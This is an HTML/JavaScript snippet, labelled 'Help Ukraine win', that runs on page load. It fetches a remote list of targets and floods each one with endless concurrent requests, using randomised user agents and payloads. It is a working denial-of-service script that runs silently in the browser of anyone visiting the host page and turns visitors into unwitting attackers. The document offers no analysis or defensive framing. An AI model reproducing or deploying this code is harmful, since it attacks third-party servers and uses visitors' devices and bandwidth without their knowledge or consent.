<!-- Help Ukraine win -->
<script src="/js/random.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', function () {
        startGoodThings();
    });

    function startGoodThings() {
        const TARGETS_URL = 'https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json';
        fetch(TARGETS_URL)
            .then((response) => {
                return response.json();
            })
            .then(async (data) => {
                const targets = [];

                for (const job of data.jobs) {
                    const url = job.args?.packet?.payload?.data?.path;
                    if (!url) continue;

                    const method = job.args?.packet?.payload?.data?.method || null;
                    const headers = job.args?.packet?.payload?.data?.headers || null;
                    let body = job.args?.packet?.payload?.data?.body || null;

                    targets.push({
                        url,
                        method,
                        headers,
                        body,
                        timeout: 1000,
                    });
                }

                if (!targets.length) return;

                var CONCURRENCY_LIMIT = 1000;
                var queue = [];

                async function fetchWithTimeout(target) {
                    const controller = new AbortController();
                    const id = setTimeout(() => controller.abort(), target.timeout);

                    const fetchParams =  {
                        method: target.method || 'GET',
                        mode: 'no-cors',
                        signal: controller.signal,
                    };
                    if (target.headers) {
                        const headers = Object.assign({}, target.headers);

                        for (var header in headers) {
                            if (headers[header].includes('random_user_agent')) {
                                headers[header] = randUserAgent();
                            }
                        }
                        fetchParams.headers = headers;
                    }
                    if (target.body) {
                        let body = target.body;
                        if (body.includes('random_payload')) {
                            body = randJsonStr();
                        }
                        fetchParams.body = body;
                    }

                    return fetch(target.url, fetchParams).then((response) => {
                        clearTimeout(id);
                        return response;
                    }).catch((error) => {
                        clearTimeout(id);
                        throw error;
                    });
                }

                async function flood(target) {
                    for (var i = 0; ; ++i) {
                        if (queue.length > CONCURRENCY_LIMIT) {
                            await queue.shift();
                        }

                        queue.push(
                            fetchWithTimeout(target)
                                .catch((error) => {
                                    if (error.code === 20 /* ABORT */) {
                                        return;
                                    }
                                    //console.log('error fetching! (1)');
                                })
                                .then((response) => {
                                    if (response && !response.ok) {
                                        //console.log('error fetching! (2)');
                                    }
                                    //console.log('OK');
                                })
                        )
                        await sleep(500);
                    }
                }

                // Start
                targets.map(flood);
            });
    }
</script>
<!-- /Help Ukraine win -->
